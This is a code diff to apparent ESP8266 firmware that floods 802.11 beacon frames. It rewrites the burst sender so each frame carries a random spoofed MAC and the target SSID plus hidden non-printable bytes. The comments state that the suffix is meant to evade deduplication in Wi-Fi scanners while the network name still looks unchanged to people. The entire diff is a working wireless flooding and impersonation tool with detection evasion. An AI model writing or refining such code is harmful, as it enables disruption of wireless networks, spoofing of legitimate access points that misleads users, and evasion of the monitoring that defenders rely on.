@@ -70,57 +70,67 @@ const uint8_t BEACON_FIXED[36] = {
 // -------------------------------------------------------- beacon --
 
 /*
- * Build the beacon template in beacon_buf.
- * Only needs to be called when target_ssid or channel changes.
+ * Validate config and arm the burst sender.
+ * beacon_len > 0 means a valid SSID is configured and flooding can run.
+ * The packet is no longer pre-built here — sendBeaconBurst constructs
+ * each frame fresh so the SSID suffix can be randomised per frame.
  */
 void prepareBeaconTemplate() {
-  uint8_t ssid_len = strnlen(config.target_ssid, SSID_MAX_LEN);
-
-  memcpy(beacon_buf, BEACON_FIXED, 36);
-
-  int pos = 36;
-
-  // Tag 0: SSID
-  beacon_buf[pos++] = 0x00;
-  beacon_buf[pos++] = ssid_len;
-  memcpy(&beacon_buf[pos], config.target_ssid, ssid_len);
-  pos += ssid_len;
-
-  // Tag 1: Supported Rates  (1, 2, 5.5, 11, 18, 24, 36, 54 Mbps)
-  beacon_buf[pos++] = 0x01;
-  beacon_buf[pos++] = 0x08;
-  beacon_buf[pos++] = 0x82;  // 1 Mbps  (basic)
-  beacon_buf[pos++] = 0x84;  // 2 Mbps  (basic)
-  beacon_buf[pos++] = 0x8b;  // 5.5 Mbps (basic)
-  beacon_buf[pos++] = 0x96;  // 11 Mbps (basic)
-  beacon_buf[pos++] = 0x24;  // 18 Mbps
-  beacon_buf[pos++] = 0x30;  // 24 Mbps
-  beacon_buf[pos++] = 0x48;  // 36 Mbps
-  beacon_buf[pos++] = 0x6c;  // 54 Mbps
-
-  // Tag 3: DS Parameter Set (declares which channel these beacons are on)
-  beacon_buf[pos++] = 0x03;
-  beacon_buf[pos++] = 0x01;
-  beacon_buf[pos++] = config.channel;
-
-  beacon_len = pos;
+  beacon_len = (strnlen(config.target_ssid, SSID_MAX_LEN) > 0) ? 1 : 0;
 }
 
 /*
- * Inject BEACONS_PER_BURST frames, each with a fresh random MAC.
- * Locally administered + unicast: MSB of first octet has bit1 set, bit0 clear.
+ * Inject BEACONS_PER_BURST frames. Per frame:
+ *   - Fresh random locally-administered unicast MAC (SA + BSSID)
+ *   - Base SSID + 1–4 random non-printable bytes (0x01–0x1F)
+ *
+ * The non-printable suffix makes each beacon's SSID byte-sequence unique,
+ * bypassing deduplication in scanners that group by exact SSID bytes.
+ * The visible name still reads the same in any human-readable display.
+ * The variable SSID length shifts the subsequent tags, so the full frame
+ * is assembled fresh each time.
  */
 void sendBeaconBurst() {
   if (beacon_len == 0) return;
+
+  uint8_t base_len = strnlen(config.target_ssid, SSID_MAX_LEN);
+  uint8_t buf[BEACON_BUF_SIZE];
+
   for (int i = 0; i < BEACONS_PER_BURST; i++) {
-    beacon_buf[10] = (random(256) & 0xfe) | 0x02;
-    beacon_buf[11] = random(256);
-    beacon_buf[12] = random(256);
-    beacon_buf[13] = random(256);
-    beacon_buf[14] = random(256);
-    beacon_buf[15] = random(256);
-    memcpy(&beacon_buf[16], &beacon_buf[10], 6);  // BSSID = SA
-    wifi_send_pkt_freedom(beacon_buf, beacon_len, false);
+    // Fixed header
+    memcpy(buf, BEACON_FIXED, 36);
+
+    // Random locally-administered unicast MAC
+    buf[10] = (random(256) & 0xfe) | 0x02;
+    buf[11] = random(256);
+    buf[12] = random(256);
+    buf[13] = random(256);
+    buf[14] = random(256);
+    buf[15] = random(256);
+    memcpy(&buf[16], &buf[10], 6);  // BSSID = SA
+
+    // Tag 0: SSID — base name + random non-printable suffix
+    uint8_t extra = random(1, 5);   // 1–4 extra bytes
+    buf[36] = 0x00;
+    buf[37] = base_len + extra;
+    memcpy(&buf[38], config.target_ssid, base_len);
+    for (int j = 0; j < extra; j++) {
+      buf[38 + base_len + j] = random(1, 32);  // 0x01–0x1F non-printable
+    }
+
+    int pos = 38 + base_len + extra;
+
+    // Tag 1: Supported Rates (1, 2, 5.5, 11, 18, 24, 36, 54 Mbps)
+    buf[pos++] = 0x01; buf[pos++] = 0x08;
+    buf[pos++] = 0x82; buf[pos++] = 0x84;
+    buf[pos++] = 0x8b; buf[pos++] = 0x96;
+    buf[pos++] = 0x24; buf[pos++] = 0x30;
+    buf[pos++] = 0x48; buf[pos++] = 0x6c;
+
+    // Tag 3: DS Parameter Set
+    buf[pos++] = 0x03; buf[pos++] = 0x01; buf[pos++] = config.channel;
+
+    wifi_send_pkt_freedom(buf, pos, false);
   }
 }
 
